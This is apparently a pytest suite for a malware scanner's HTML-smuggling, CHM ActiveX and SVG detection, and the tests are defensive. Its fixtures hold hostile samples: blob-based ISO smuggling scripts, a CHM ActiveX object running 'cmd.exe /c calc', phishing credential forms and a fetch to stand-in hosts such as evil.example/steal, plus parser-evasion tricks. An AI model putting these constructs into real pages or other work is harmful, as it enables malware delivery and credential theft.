"""Tests for WebContentPipeline (Spec 014 — HTML smuggling, CHM ActiveX & SVG)."""

from __future__ import annotations

import base64
import io
import time
import zipfile
from pathlib import Path

import pytest

from malaz.analysis.clamav import ClamAVScanner
from malaz.analysis.windows_av import WindowsDefenderScanner
from malaz.core.dispatcher import Dispatcher
from malaz.models import RiskLevel


def _dispatcher() -> Dispatcher:
    return Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )


def _scan(tmp_path: Path, name: str, data: bytes):
    p = tmp_path / name
    p.write_bytes(data)
    return _dispatcher().scan_path(p)


def _rule_ids(res) -> set[str]:
    return {i.rule_id for i in res.all_indicators()}


def _minimal_pe() -> bytes:
    buf = bytearray(256)
    buf[0:2] = b"MZ"
    buf[60:64] = (0x80).to_bytes(4, "little")
    buf[0x80:0x84] = b"PE\x00\x00"
    return bytes(buf)


def _minimal_zip() -> bytes:
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w") as zf:
        zf.writestr("hello.txt", b"payload" * 20)
    return bio.getvalue()


def _minimal_iso() -> bytes:
    buf = bytearray(0x8020)
    buf[0x8001:0x8006] = b"CD001"
    return bytes(buf)


def _minimal_lnk() -> bytes:
    return (
        b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
        + b"\x00" * 120
    )


def _minimal_png() -> bytes:
    return (
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
        b"\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc``\x00\x00"
        b"\x00\x04\x00\x01\xf6\x178U\x00\x00\x00\x00IEND\xaeB`\x82"
    )


def test_html_smuggling_classic_blob_download(tmp_path: Path) -> None:
    html_bytes = (
        b"<!DOCTYPE html><html><body><script>"
        b"var bin = atob('SGVsbG8gV29ybGQgZnJvbSBzbXVnZ2xlZCBIVE1MIQ==');"
        b"var arr = new Uint8Array(bin.length);"
        b"var blob = new Blob([arr], {type: 'application/octet-stream'});"
        b"var a = document.createElement('a');"
        b"a.href = URL.createObjectURL(blob);"
        b"a.download = 'rechnung.iso';"
        b"a.click();"
        b"</script></body></html>"
    )
    res = _scan(tmp_path, "invoice.html", html_bytes)
    assert "HTML_SMUGGLING" in _rule_ids(res)
    assert res.risk_level in (RiskLevel.YELLOW, RiskLevel.RED)
    assert res.score >= 35


@pytest.mark.parametrize(
    ("label", "payload"),
    [
        ("pe", _minimal_pe()),
        ("zip", _minimal_zip()),
        ("iso", _minimal_iso()),
        ("lnk", _minimal_lnk()),
    ],
)
def test_html_smuggled_payload_magics(tmp_path: Path, label: str, payload: bytes) -> None:
    b64 = base64.b64encode(payload).decode("ascii")
    html_bytes = f"<!DOCTYPE html><html><script>var p = '{b64}';</script></html>".encode()
    res = _scan(tmp_path, f"smug_{label}.html", html_bytes)
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res)
    assert res.risk_level == RiskLevel.RED
    assert res.score >= 50


def test_html_smuggled_payload_wrapped_concat_array_join_and_starvation(tmp_path: Path) -> None:
    # 1. Line-wrapped Base64 (76-char wrap)
    wrapped = base64.encodebytes(_minimal_zip()).decode("ascii")
    res_wrap = _scan(
        tmp_path, "wrap.html", f"<!DOCTYPE html><script>var z = `{wrapped}`;</script>".encode()
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_wrap)

    # 2. String concat '...' + '...'
    b64 = base64.b64encode(_minimal_pe()).decode("ascii")
    parts = " + ".join(f"'{b64[i:i+20]}'" for i in range(0, len(b64), 20))
    res_cat = _scan(
        tmp_path, "concat.html", f"<!DOCTYPE html><script>var p = {parts};</script>".encode()
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_cat)

    # 3. Array join ['...','...'].join('')
    arr = ",".join(f"'{b64[i:i+20]}'" for i in range(0, len(b64), 20))
    res_arr = _scan(
        tmp_path,
        "join.html",
        f"<!DOCTYPE html><script>var p = [{arr}].join('');</script>".encode(),
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_arr)

    # 4. 40 benign data:image/png;base64,... icons before the 41st malicious payload
    png_b64 = base64.b64encode(_minimal_png()).decode("ascii")
    imgs = "".join(f"<img src='data:image/png;base64,{png_b64}'>" for _ in range(40))
    res_starve = _scan(
        tmp_path,
        "starve.html",
        f"<!DOCTYPE html><body>{imgs}<script>var evil = '{b64}';</script></body>".encode(),
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_starve)


def test_compact_data_html_and_svg_and_atob_depth1_recheck(tmp_path: Path) -> None:
    # 61 bytes -> 84 Base64 chars (< 128 generic threshold!)
    form_html = b'<form action="https://evil.example/post"><input type="password"></form>'
    form_b64 = base64.b64encode(form_html).decode("ascii")
    assert len(form_b64) < 128
    res = _scan(
        tmp_path,
        "iframe.html",
        f'<!DOCTYPE html><html><iframe src="data:text/html;base64,{form_b64}"></iframe></html>'.encode(),
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res)

    svg_b64 = base64.b64encode(b"<svg onload='alert(1)'/>").decode("ascii")
    res_svg = _scan(
        tmp_path,
        "img_svg.html",
        f'<!DOCTYPE html><html><object data="data:image/svg+xml;base64,{svg_b64}"></object></html>'.encode(),
    )
    assert "SVG_SCRIPT" in _rule_ids(res_svg)

    res_atob = _scan(
        tmp_path,
        "docwrite.html",
        f"<!DOCTYPE html><script>document.write(atob('{form_b64}'));</script>".encode(),
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_atob)


def test_meta_refresh_and_chm_activex(tmp_path: Path) -> None:
    # Reversed attribute order + entity-encoded javascript:
    meta_html = (
        b'<!DOCTYPE html><html><head>'
        b'<meta content="0;url=\'&#106;avascript:alert(1)\'" http-equiv="refresh">'
        b"</head></html>"
    )
    res_meta = _scan(tmp_path, "meta.html", meta_html)
    assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(res_meta)

    for clsid in (
        "clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11",
        "CLSID:52A2AAAE-085D-4187-97EA-8C30DB990436",
    ):
        chm_html = (
            f'<!DOCTYPE html><html><body>'
            f'<OBJECT id="x" type="application/x-oleobject" classid="{clsid}">'
            f'<PARAM name="Command" value="ShortCut">'
            f'<PARAM name="Item1" value=",cmd.exe,/c calc">'
            f"</OBJECT></body></html>"
        ).encode()
        res_chm = _scan(tmp_path, f"chm_{clsid[:8]}.html", chm_html)
        assert "HTML_CHM_ACTIVEX" in _rule_ids(res_chm)
        assert res_chm.risk_level == RiskLevel.RED
        assert res_chm.score >= 50


def test_svg_active_content_evasions_and_utf16_e2e(tmp_path: Path) -> None:
    # Namespaced <svg:svg> + <svg:script><![CDATA[window.location=...]]>
    ns_svg = (
        b'<svg:svg xmlns:svg="http://www.w3.org/2000/svg">'
        b"<svg:script><![CDATA[window.location='https://evil.example']]></svg:script>"
        b"</svg:svg>"
    )
    res_ns = _scan(tmp_path, "ns.svg", ns_svg)
    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT"} <= _rule_ids(res_ns)

    # <!DOCTYPE svg> + 5 KiB comment + onpointerenter + renamed to .txt
    padded_svg = (
        b"<?xml version='1.0'?>\n"
        b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
        b"<!-- " + b"A" * 5120 + b" -->\n"
        + b'<svg xmlns="http://www.w3.org/2000/svg" onpointerenter="location=\'https://phish.example\'"/>'
    )
    res_pad = _scan(tmp_path, "disguised.txt", padded_svg)
    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT"} <= _rule_ids(res_pad)

    # SMIL <animate> with entity-encoded javascript: in `from`
    smil_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<a id="l"><animate attributeName="href" from="&#106;avascript:alert(1)"/></a>'
        b"</svg>"
    )
    res_smil = _scan(tmp_path, "smil.svg", smil_svg)
    assert "SVG_SCRIPT" in _rule_ids(res_smil)

    # <foreignObject> phishing form
    fo_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="300" height="200">'
        b'<form xmlns="http://www.w3.org/1999/xhtml" action="https://phish.example/login">'
        b'<input type="password" name="pw"/></form></foreignObject></svg>'
    )
    res_fo = _scan(tmp_path, "phish.svg", fo_svg)
    assert {"SVG_FOREIGN_OBJECT", "HTML_CREDENTIAL_FORM"} <= _rule_ids(res_fo)

    # UTF-16 HTML (with BOM and BOM-less) end-to-end through Dispatcher
    raw_html = '<form action="https://phish.example"><input type="password"></form>'
    for suffix, enc in (("bom.html", "utf-16"), ("nobom.html", "utf-16-le")):
        res_u16 = _scan(tmp_path, suffix, raw_html.encode(enc))
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_u16)


def test_web_parse_limit_fail_closed(tmp_path: Path) -> None:
    flood = b"<!DOCTYPE html><html><body>" + b"<a></a>" * 100_005 + b"<script>alert(1)</script></body></html>"
    res = _scan(tmp_path, "flood.html", flood)
    assert "WEB_PARSE_LIMIT" in _rule_ids(res)
    assert res.is_incomplete
    assert res.risk_level != RiskLevel.GREEN


def test_benign_html_and_svg_stay_green_zero(tmp_path: Path) -> None:
    png_b64 = base64.b64encode(_minimal_png()).decode("ascii")
    benign_cases = {
        "manual.html": (
            b"<!DOCTYPE html><html><head><title>Handbuch</title></head>"
            b"<body><h1>Kapitel 1</h1><p>Willkommen.</p></body></html>"
        ),
        "csv_export.html": (
            b"<!DOCTYPE html><html><body><script>"
            b"var csv = atob('YSxiCmMsZAo=');"
            b"var blob = new Blob([csv], {type: 'text/csv'});"
            b"var a = document.createElement('a');"
            b"a.href = URL.createObjectURL(blob);"
            b"a.download = 'export.csv';"
            b"a.click();"
            b"</script></body></html>"
        ),
        "local_login.html": (
            b'<!DOCTYPE html><html><body>'
            b'<form action="/login" method="post"><input type="password" name="pw"></form>'
            b"</body></html>"
        ),
        "https_refresh.html": (
            b'<!DOCTYPE html><html><head>'
            b'<meta http-equiv="refresh" content="5;url=https://example.org/docs">'
            b"</head></html>"
        ),
        "drawio_diagram.svg": (
            b'<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">'
            b'<foreignObject width="200" height="50">'
            b'<div xmlns="http://www.w3.org/1999/xhtml">Architecture Node</div>'
            b"</foreignObject>"
            b"<text x='10' y='90'>Location = Frankfurt; window.open() example</text>"
            b"</svg>"
        ),
        "logo.svg": (
            f'<svg xmlns="http://www.w3.org/2000/svg">'
            f'<a href="https://example.org"><image href="data:image/png;base64,{png_b64}"/></a>'
            f"</svg>"
        ).encode(),
        "invoice.xml": b'<?xml version="1.0"?><invoice><amount>42.00</amount></invoice>',
        "benign_note.hta": b"Simple documentation note without HTML or scripts.\n",
    }
    for name, content in benign_cases.items():
        res = _scan(tmp_path, name, content)
        assert res.risk_level == RiskLevel.GREEN, f"{name}: {_rule_ids(res)}"
        assert res.score == 0, f"{name}: score={res.score}, rules={_rule_ids(res)}"


def test_web_pipeline_redos_linear_runtime(tmp_path: Path) -> None:
    adv1 = b"<!DOCTYPE html>" + b"<a " * 20_000
    adv2 = b"<!DOCTYPE html><script>var s = " + b"'A'+" * 10_000 + b"'A';</script>"
    started = time.perf_counter()
    _scan(tmp_path, "adv1.html", adv1)
    _scan(tmp_path, "adv2.html", adv2)
    elapsed = time.perf_counter() - started
    assert elapsed < 3.0, f"Adversarial HTML took too long: {elapsed:.2f}s"


def test_review_regressions_cdata_arrow_oversize_rfc2397_smil_and_linear_trailing_gt(
    tmp_path: Path,
) -> None:
    # 1. Blocker 1: tags AFTER <script>...</script> and <style> must still be parsed!
    after_script = (
        b"<!DOCTYPE html><html><head><script>var ok = 1;</script><style>body{}</style></head>"
        b'<body><form action="https://phish.example/steal"><input type="password"></form></body></html>'
    )
    res_after = _scan(tmp_path, "after_script.html", after_script)
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_after)

    # 2. Blocker 2A: '>' inside quoted attribute value (JS arrow function =>)
    arrow_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" '
        b'onload="fetch(\'https://evil.example\').then(r => r.text())"/>'
    )
    res_arrow = _scan(tmp_path, "arrow.svg", arrow_svg)
    assert "SVG_SCRIPT" in _rule_ids(res_arrow)

    # 3. Blocker 2B: oversized active tag > 64 KiB fails closed (WEB_PARSE_LIMIT),
    #    while benign oversized <path d="..."> stays GREEN 0.
    huge_active = (
        b'<svg xmlns="http://www.w3.org/2000/svg" data-pad="'
        + b"A" * 70_000
        + b'" onload="alert(1)"/>'
    )
    res_ha = _scan(tmp_path, "huge_active.svg", huge_active)
    assert "WEB_PARSE_LIMIT" in _rule_ids(res_ha)
    assert res_ha.is_incomplete

    huge_path = (
        b'<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0'
        + b" L1 1" * 15_000
        + b'"/></svg>'
    )
    res_hp = _scan(tmp_path, "huge_path.svg", huge_path)
    assert res_hp.risk_level == RiskLevel.GREEN
    assert res_hp.score == 0

    # 4. Major 3: unclosed '<a '*60_000 WITH trailing '>' must remain strictly O(N)
    adv_gt = b"<!DOCTYPE html>" + b"<a " * 60_000 + b">"
    t0 = time.perf_counter()
    _scan(tmp_path, "adv_gt.html", adv_gt)
    assert time.perf_counter() - t0 < 2.0

    # 5a. Major 4: RFC-2397 ';charset=utf-8;base64,'
    form_b64 = base64.b64encode(
        b'<form action="https://evil.example"><input type="password"></form>'
    ).decode("ascii")
    res_cs = _scan(
        tmp_path,
        "charset.html",
        f'<!DOCTYPE html><iframe src="data:text/html;charset=utf-8;base64,{form_b64}"></iframe>'.encode(),
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_cs)

    # 5b. Major 4: seen_prefix collision (null prefix before real ISO)
    dummy_zeros = base64.b64encode(b"\x00" * 200).decode("ascii")
    iso_b64 = base64.b64encode(_minimal_iso()).decode("ascii")
    res_iso = _scan(
        tmp_path,
        "iso_collide.html",
        f"<!DOCTYPE html><script>var a='{dummy_zeros}'; var b='{iso_b64}';</script>".encode(),
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_iso)

    # 5c. Major 4: 300 benign PNG data-URIs before atob(...) must not starve atob
    png_b64 = base64.b64encode(_minimal_png()).decode("ascii")
    pngs = "".join(f"<img src='data:image/png;base64,{png_b64}'>" for _ in range(300))
    res_atob = _scan(
        tmp_path,
        "atob_after_pngs.html",
        f"<!DOCTYPE html><body>{pngs}<script>document.write(atob('{form_b64}'));</script></body>".encode(),
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_atob)

    # 5d. Major 4: CDATA comment inside <script> must not discard JS outside CDATA
    cdata_mix = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b"<script>window.location='https://evil.example'; // <![CDATA[x]]></script>"
        b"</svg>"
    )
    res_cd = _scan(tmp_path, "cdata_mix.svg", cdata_mix)
    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT"} <= _rule_ids(res_cd)

    # 5e. Major 4: SMIL semicolon-separated values list
    smil_list = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<a id="x"><animate attributeName="href" values="https://safe.example;javascript:alert(1)"/></a>'
        b"</svg>"
    )
    res_sl = _scan(tmp_path, "smil_list.svg", smil_list)
    assert "SVG_SCRIPT" in _rule_ids(res_sl)

    # 5f. Major 4: pure smuggling JS inside atob(...) without HTML tags
    js_smug = base64.b64encode(
        b"var b=new Blob(['x']); var u=URL.createObjectURL(b); a.download='inv.iso'; a.click();"
    ).decode("ascii")
    res_js = _scan(
        tmp_path,
        "atob_js.html",
        f"<!DOCTYPE html><script>eval(atob('{js_smug}'));</script>".encode(),
    )
    assert "HTML_SMUGGLING" in _rule_ids(res_js)

    # 6. Nit 5: msSaveOrOpenBlob is NOT suppressed by a benign <a download="readme.txt">
    ms_save = (
        b'<!DOCTYPE html><body><a download="readme.txt" href="#">Help</a>'
        b"<script>var b=new Blob([atob('SGVsbG8=')]); navigator.msSaveOrOpenBlob(b, 'x.bin');</script>"
        b"</body></html>"
    )
    res_ms = _scan(tmp_path, "mssave.html", ms_save)
    assert "HTML_SMUGGLING" in _rule_ids(res_ms)


def test_review_r2_regressions_html5_comments_rawtext_unquoted_and_polygon_path(
    tmp_path: Path,
) -> None:
    # Blocker 1a: literal '<' in prose + apostrophe before phishing form
    prose_lt = (
        b"<!DOCTYPE html><html><body><p>If x < 5 and it's fine</p>"
        b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "prose_lt.html", prose_lt))

    # Blocker 1b: HTML5 unquoted attribute containing apostrophe
    unq_attr = (
        b"<!DOCTYPE html><html><body><meta name=author content=O'Brien>"
        b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "unq_attr.html", unq_attr))

    # Blocker 1c: <style> RAWTEXT with "< '" before phishing form
    style_raw = (
        b"<!DOCTYPE html><html><head><style>/* < ' */</style></head>"
        b'<body><form action="https://phish.example/steal"><input type="password"></form></body></html>'
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "style_raw.html", style_raw))

    # Blocker 2: HTML5 abrupt comments <!-->, <!--->, --!> and bogus <![CDATA[>
    for idx, prefix in enumerate((b"<!-->", b"<!--->", b"<!-- x --!>", b"<![CDATA[>")):
        doc = (
            b"<!DOCTYPE html><html><body>"
            + prefix
            + b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
        )
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"comment_{idx}.html", doc))

    # Major 1: benign oversized <polygon> and <path fill="none"> (> 64 KiB) stay GREEN 0
    huge_poly = (
        b'<svg xmlns="http://www.w3.org/2000/svg"><polygon points="'
        + b"10,20 " * 12_000
        + b'"/></svg>'
    )
    res_poly = _scan(tmp_path, "huge_poly.svg", huge_poly)
    assert res_poly.risk_level == RiskLevel.GREEN and res_poly.score == 0

    huge_path_none = (
        b'<svg xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="none" d="M0 0'
        + b" L1 1" * 15_000
        + b'"/></svg>'
    )
    res_pn = _scan(tmp_path, "huge_path_none.svg", huge_path_none)
    assert res_pn.risk_level == RiskLevel.GREEN and res_pn.score == 0


def test_review_r3_regressions_bogus_comments_slash_endtags_and_quoted_event_attr(
    tmp_path: Path,
) -> None:
    # Major 1: HTML5 bogus comments <!x a="> and <?x a="> before phishing form/meta
    for idx, prefix in enumerate((b'<!x a=">', b'<?x a=">')):
        doc = (
            b"<!DOCTYPE html><html><body>"
            + prefix
            + b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
        )
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"bogus_{idx}.html", doc))

    # Major 2: HTML5 end-tags with slash/attr: </style/x>, </script/x>, </style foo>
    for idx, block in enumerate(
        (
            b"<style>body{}</style/x>",
            b"<style>body{}</style foo>",
            b"<script>var x=1;</script/x>",
        )
    ):
        doc = (
            b"<!DOCTYPE html><html><head>"
            + block
            + b'</head><body><form action="https://phish.example/steal">'
            b'<input type="password"></form></body></html>'
        )
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"endtag_{idx}.html", doc))

    # Major 3: oversized <path d="..."onload="alert(1)"/> without space before onload
    no_space_ev = (
        b'<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0'
        + b" L1 1" * 15_000
        + b'"onload="alert(1)"/></svg>'
    )
    res_ev = _scan(tmp_path, "oversized_nospace_ev.svg", no_space_ev)
    assert "WEB_PARSE_LIMIT" in _rule_ids(res_ev)
    assert res_ev.is_incomplete


def test_review_r4_regressions_rcdata_rawtext_and_linear_comments_pis(
    tmp_path: Path,
) -> None:
    # Blocker 1: HTML5 RCDATA/RAWTEXT elements with unclosed quote must NOT swallow later tags
    for tag in ("title", "textarea", "xmp", "iframe", "noembed", "noframes"):
        doc_chm = (
            f'<!DOCTYPE html><html><head><{tag}><x a="</{tag}></head><body>'
            f'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
            f'<param name="Command" value="ShortCut"></object></body></html>'
        ).encode()
        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"rcdata_{tag}_chm.html", doc_chm))

        doc_cred = (
            f'<!DOCTYPE html><html><body><{tag}><x a="</{tag}>'
            f'<form action="https://phish.example/steal"><input type="password"></form>'
            f"</body></html>"
        ).encode()
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(
            _scan(tmp_path, f"rcdata_{tag}_cred.html", doc_cred)
        )

        doc_meta = (
            f'<!DOCTYPE html><html><head><{tag}><x a="</{tag}>'
            f'<meta http-equiv="refresh" content="0;url=javascript:alert(1)"></head></html>'
        ).encode()
        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
            _scan(tmp_path, f"rcdata_{tag}_meta.html", doc_meta)
        )

    # Ensure <iframe src="data:text/html;base64,..."> still fires HTML_CREDENTIAL_FORM
    form_b64 = base64.b64encode(
        b'<form action="https://phish.example"><input type="password"></form>'
    ).decode("ascii")
    iframe_doc = (
        f'<!DOCTYPE html><html><body><iframe src="data:text/html;base64,{form_b64}">'
        f"fallback</iframe></body></html>"
    ).encode()
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "iframe_attr.html", iframe_doc))

    # Major 2: O(N) runtime on 50,000 comments without '--!>' and 50,000 SVG PIs without '?>'
    many_comments = b"<!DOCTYPE html><html><body>" + b"<!--a-->" * 50_000 + b"</body></html>"
    many_pis = b"<svg xmlns='http://www.w3.org/2000/svg'>" + b"<?a>" * 50_000 + b"</svg>"
    t0 = time.perf_counter()
    _scan(tmp_path, "many_comments.html", many_comments)
    _scan(tmp_path, "many_pis.svg", many_pis)
    assert time.perf_counter() - t0 < 2.0


def test_review_r5_regressions_svg_prefix_in_html_self_closing_rawtext_and_bang_comments(
    tmp_path: Path,
) -> None:
    # Blocker 1: leading <svg></svg> in .html must stay in HTML5 tokenizer mode!
    svg_cdata_chm = (
        b'<svg></svg><![CDATA[>'
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
    )
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "svg_prefix_chm.html", svg_cdata_chm))

    svg_ta_cred = (
        b'<svg></svg><textarea><x a="</textarea>'
        b'<form action="https://phish.example"><input type="password"></form><!--"-->'
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "svg_prefix_ta.html", svg_ta_cred))

    svg_pi_cred = (
        b'<svg></svg><?x>'
        b'<form action="https://phish.example"><input type="password"></form>?>'
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "svg_prefix_pi.html", svg_pi_cred))

    # Blocker 2: HTML5 self-closing <textarea/> / <style/> / <script/> must NOT close RAWTEXT
    for tag in ("textarea", "title", "style", "script", "xmp", "iframe", "noembed", "noframes"):
        doc = (
            f'<!DOCTYPE html><html><body><{tag}/><x a="</{tag}>'
            f'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
            f'<param name="Command" value="ShortCut"></object><!--"--></body></html>'
        ).encode()
        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"selfclose_{tag}.html", doc))

    # Major 3: O(N) runtime on ('<!-- --!>' * 50_000) + '-->'
    adv_bang = b"<!DOCTYPE html>" + b"<!-- --!>" * 50_000 + b"-->"
    t0 = time.perf_counter()
    _scan(tmp_path, "adv_bang_comments.html", adv_bang)
    assert time.perf_counter() - t0 < 2.0


def test_review_r6_regressions_foreign_self_closing_and_html5_eq_attr_states(
    tmp_path: Path,
) -> None:
    # Blocker 1: HTML5 foreign-content self-closing (<svg>/<math>)
    for idx, prefix in enumerate(
        (
            b"<svg><title/></svg>",
            b"<svg><style/></svg>",
            b"<svg><script/></svg>",
            b"<math><style/></math>",
            b'<svg/><textarea><x a="</textarea>',
        )
    ):
        doc_cred = (
            b"<!DOCTYPE html><html><body>"
            + prefix
            + b'<form action="https://phish.example/steal"><input type="password"></form>'
            b"</body></html>"
        )
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"fsc_cred_{idx}.html", doc_cred))

        doc_chm = (
            b"<!DOCTYPE html><html><body>"
            + prefix
            + b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
            b'<param name="Command" value="ShortCut"></object></body></html>'
        )
        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"fsc_chm_{idx}.html", doc_chm))

    # Blocker 2: HTML5 leading '=' (<a =">, <a/=">) and duplicate '=' (<a x==">, <a x= =">)
    for idx, bad_tag in enumerate((b'<a =">', b'<a/=">', b'<a x==">', b'<a x= =">')):
        doc_chm = (
            b"<!DOCTYPE html><html><body>"
            + bad_tag
            + b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
            b'<param name="Command" value="ShortCut"></object><!--"--></body></html>'
        )
        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"eq_chm_{idx}.html", doc_chm))

        doc_cred = (
            b"<!DOCTYPE html><html><body>"
            + bad_tag
            + b'<form action="https://phish.example/steal"><input type="password"></form>'
            b'<!--"--></body></html>'
        )
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"eq_cred_{idx}.html", doc_cred))

        doc_meta = (
            b"<!DOCTYPE html><html><head>"
            + bad_tag
            + b'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
            b'<!--"--></head></html>'
        )
        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
            _scan(tmp_path, f"eq_meta_{idx}.html", doc_meta)
        )


def test_review_r7_regressions_foreignobject_html_ns_and_streaming_caps(
    tmp_path: Path,
) -> None:
    # Blocker 1: <textarea/> inside <svg><foreignObject> in .html is HTML namespace (RCDATA)
    fo_doc = (
        b'<!DOCTYPE html><html><body><svg><foreignObject><textarea/><x a="</textarea>'
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object>'
        b'<!--"--></foreignObject></svg></body></html>'
    )
    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "fo_ta_chm.html", fo_doc))

    # Blocker 2a: 40 benign download names before risky .iso must NOT starve HTML_SMUGGLING
    benign_dls = "".join(f'<a download="f{i}.txt" href="#">x</a>' for i in range(40))
    smug_pad = (
        f"<!DOCTYPE html><body>{benign_dls}<script>"
        "var b=new Blob([atob('SGVsbG8=')]); var u=URL.createObjectURL(b);"
        "var a=document.createElement('a'); a.download='invoice.iso'; a.click();"
        "</script></body></html>"
    ).encode()
    assert "HTML_SMUGGLING" in _rule_ids(_scan(tmp_path, "dl_starve.html", smug_pad))

    # Blocker 2b: 12 benign https:// meta-refresh tags before javascript: meta-refresh
    benign_metas = "".join(
        f'<meta http-equiv="refresh" content="{i};url=https://example.org">' for i in range(12)
    )
    meta_pad = (
        f"<!DOCTYPE html><head>{benign_metas}"
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)"></head></html>'
    ).encode()
    assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(_scan(tmp_path, "meta_starve.html", meta_pad))

    # Blocker 2c: 150 empty <script></script> + 80 benign onclick="0" before exfil fetch()
    pad_scripts = "<script></script>" * 150
    pad_events = "".join('<span onclick="0"></span>' for _ in range(80))
    cred_pad = (
        f"<!DOCTYPE html><body>{pad_scripts}{pad_events}"
        '<form><input type="password"></form>'
        "<script>fetch('https://evil.example/steal')</script></body></html>"
    ).encode()
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "cred_starve.html", cred_pad))

    # Blocker 2d: 150 empty <script></script> before SVG redirect
    svg_pad = (
        f'<svg xmlns="http://www.w3.org/2000/svg">{pad_scripts}'
        "<script>window.location='https://evil.example'</script></svg>"
    ).encode()
    assert "SVG_EXTERNAL_REDIRECT" in _rule_ids(_scan(tmp_path, "svg_starve.svg", svg_pad))


def test_review_r8_regressions_lt_in_tag_endtag_bogus_and_foreign_cdata(
    tmp_path: Path,
) -> None:
    chm_tail = (
        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
        b'<param name="Command" value="ShortCut"></object><!--"--></body></html>'
    )
    cred_tail = (
        b'<form action="https://phish.example/steal"><input type="password"></form>'
        b'<!--"--></body></html>'
    )
    meta_tail = (
        b'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
        b'<!--"--></head></html>'
    )

    # Blocker 1: '<' inside open HTML5 tag (<a <!--x>, <a <script>>, <a <style>>, <a x=1<b/y=">)
    # Blocker 2: end-tag open state (</1 a=">, </ a=">, </d=">) and non-ASCII <ä a=">
    # Major 3: <![CDATA[...]]> inside <svg> foreign content in .html
    prefixes = (
        b"<a <!--x>",
        b"<a <script>>",
        b"<a <style>>",
        b'<a x=1<b/y=">',
        b'</1 a=">',
        b'</ a=">',
        b'</d=">',
        "<\u00e4 a=\">".encode(),
        b'<svg><![CDATA[ ><x a=" ]]></svg>',
    )
    for idx, prefix in enumerate(prefixes):
        assert "HTML_CHM_ACTIVEX" in _rule_ids(
            _scan(tmp_path, f"r8_chm_{idx}.html", b"<!DOCTYPE html><html><body>" + prefix + chm_tail)
        ), f"CHM missed for prefix {idx}"
